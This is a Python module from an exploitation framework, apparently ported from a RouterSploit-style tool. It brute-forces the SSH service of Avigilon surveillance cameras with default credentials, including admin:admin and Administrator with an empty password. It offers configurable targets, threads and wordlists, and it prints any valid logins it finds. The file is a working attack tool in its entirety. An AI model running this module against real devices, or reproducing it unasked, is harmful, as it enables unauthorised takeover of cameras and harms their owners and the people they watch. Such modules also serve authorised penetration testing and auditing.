# Author: André Henrique (LinkedIn/X: @mrhenrike)
from embedxpl.core.exploit import *
from embedxpl.modules.creds.generic.ssh_default import Exploit as SSHDefault


class Exploit(SSHDefault):
    """Avigilon Camera — Default SSH Credentials.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Avigilon Camera Default SSH Creds",
        "description": (
            "Module performs dictionary attack with default credentials against Avigilon Camera SSH service. "
            "If valid credentials are found, they are displayed to the user."
        ),
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",
            "André Henrique (@mrhenrike) — EmbedXPL-Forge port",
        ),
        "devices": (
            "Avigilon Camera",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(22, "Target SSH port")

    threads = OptInteger(8, "Number of threads")
    defaults = OptWordlist("admin:admin,Administrator:", "User:Pass or file with default credentials (file://)")
    stop_on_success = OptBool(True, "Stop on first valid authentication attempt")
    verbosity = OptBool(True, "Display authentication attempts")
